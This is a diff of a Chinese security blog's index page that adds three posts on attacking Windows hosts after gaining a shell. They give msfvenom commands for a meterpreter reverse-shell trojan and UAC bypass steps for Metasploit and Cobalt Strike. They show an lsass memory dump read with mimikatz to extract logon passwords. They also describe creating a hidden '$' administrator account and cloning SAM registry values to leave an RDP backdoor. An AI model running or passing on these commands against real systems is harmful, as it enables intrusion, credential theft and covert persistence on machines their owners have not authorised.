@@ -393,6 +393,465 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/Windows下bypassuac/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/11/08/Windows下bypassuac/" class="post-title-link" itemprop="url">Windows下bypassuac</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-08 19:27:00" itemprop="dateCreated datePublished" datetime="2019-11-08T19:27:00+08:00">2019-11-08</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-11-09 18:12:19" itemprop="dateModified" datetime="2019-11-09T18:12:19+08:00">2019-11-09</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！</p>
+<h1 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h1><p>有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样<br><img src="/2019/11/08/Windows下bypassuac/error.png" alt><br>这个问题是要用管理员打开cmd才能添加账号<br><img src="/2019/11/08/Windows下bypassuac/cmd_1.png" alt><br><img src="/2019/11/08/Windows下bypassuac/cmd_2.png" alt><br>这个时候我们就要绕过windows的uac策略了</p>
+<h1 id="Msf-bypassuac"><a href="#Msf-bypassuac" class="headerlink" title="Msf bypassuac"></a>Msf bypassuac</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#生成一个木马文件，放到目标机器上面</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.128 --platform windows lport=4444 -f exe &gt; uac.exe</span><br><span class="line"></span><br><span class="line">#打开msfconsole，设置监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br><span class="line">#然后在目标机器上面运行传上去的木马文件</span><br></pre></td></tr></table></figure>
+<p>这个时候我们拿到了meterpreter<br><img src="/2019/11/08/Windows下bypassuac/getsystem_1.png" alt></p>
+<p>getsystem是有问题的，说明不是最高权限</p>
+<p>这个时候我们返回msf控制台，并保留session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#设置uac的payload</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/08/Windows下bypassuac/getsystem_2.png" alt><br>这个时候getsystem应该没有问题了<br><img src="/2019/11/08/Windows下bypassuac/success.png" alt></p>
+<p>bypassuac成功，可以添加用户了</p>
+<h1 id="cobalt-strike-bypassuac"><a href="#cobalt-strike-bypassuac" class="headerlink" title="cobalt strike bypassuac"></a>cobalt strike bypassuac</h1><p><img src="/2019/11/08/Windows下bypassuac/shell.png" alt><br>一样的，首先生成一个后门木马，上传到目标机器上面，并且运行<br><img src="/2019/11/08/Windows下bypassuac/sherl.png" alt><br>看到这里有回显了，右键进入beacon，输入bypassuac<br><img src="/2019/11/08/Windows下bypassuac/csbypass.png" alt><br>然后设置好监听的端口，输入命令<br><img src="/2019/11/08/Windows下bypassuac/cs.png" alt><br>就成功啦~</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/" class="post-title-link" itemprop="url">使用procdump64和mimikatz抓取Windows用户密码</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-08 16:52:49 / 修改时间：19:24:52" itemprop="dateCreated datePublished" datetime="2019-11-08T16:52:49+08:00">2019-11-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章<br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/error.png" alt><br>报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span><br></pre></td></tr></table></figure></p>
+<h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>利用procdump64+mimikatz解决，前提是windows要运行了lsass.exe<br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/lsass.png" alt></p>
+<p>并且命令要在cmd右键管理员身份运行，这里就要bypassuac了，不然运行命令会保存</p>
+<p>lsass.exe用户安全和登陆策略，我们要通过procdump64读取其中的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></p>
+<p>然后用mimikatz读取这个生成的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p>就成功了</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/06/Windows下两个隐藏后门用户的小技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/11/06/Windows下两个隐藏后门用户的小技巧/" class="post-title-link" itemprop="url">Windows下两个隐藏后门用户的小技巧</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-06 20:20:56 / 修改时间：21:05:19" itemprop="dateCreated datePublished" datetime="2019-11-06T20:20:56+08:00">2019-11-06</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧</p>
+<h1 id="用户后面添加"><a href="#用户后面添加" class="headerlink" title="用户后面添加$"></a>用户后面添加$</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure>
+<p>这样我们在net user的时候我们添加的用户就不会被显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/user.png" alt><br>不过在登陆的时候这个账号还是显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login.png" alt></p>
+<h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>regedit打开注册表，然后找到HKEY_LOCAL_MACHINE\SAM\SAM,右键点击权限，将读写权限赋予 administrator<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/sam.png" alt><br>重新打开注册表(这里不重新打开，sam目录下的内容无法展开)</p>
+<p>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/f.png" alt><br>复制完成后，把 defaultuser0$ 和其对应的 0000003EC 目录导出并保存(这里不一定是3EC，具体你看你用户的类型)<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/export.png" alt><br>然后删除刚才的后门用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login_2.png" alt><br>这里defaultuser0$就没有了</p>
+<p>然后我们远程桌面连接，输入后门的账号密码就行了</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/04/Solr-Velocity模板远程命令执行漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1421,441 +1880,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/14/后渗透之meterpreter初体验/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/10/14/后渗透之meterpreter初体验/" class="post-title-link" itemprop="url">后渗透之meterpreter初体验</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-10-14 16:32:51 / 修改时间：16:59:24" itemprop="dateCreated datePublished" datetime="2019-10-14T16:32:51+08:00">2019-10-14</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/10/14/后渗透之meterpreter初体验/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/12/Windows-pr提权/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/10/12/Windows-pr提权/" class="post-title-link" itemprop="url">Windows pr提权</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-10-12 18:43:31 / 修改时间：19:37:11" itemprop="dateCreated datePublished" datetime="2019-10-12T18:43:31+08:00">2019-10-12</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
-<li>Windows Server 2003 r2 Standard</li>
-<li>IIS6.0 + asp</li></ul>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/10/12/Windows-pr提权/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/11/利用DNSLOG进行盲注/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/10/11/利用DNSLOG进行盲注/" class="post-title-link" itemprop="url">利用DNSLOG进行盲注</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-10-11 17:03:11" itemprop="dateCreated datePublished" datetime="2019-10-11T17:03:11+08:00">2019-10-11</time>
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1903,7 +1927,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">43</span>
+                    <span class="site-state-item-count">46</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1936,7 +1960,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">9</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">标签</span>
                   
                 </div>
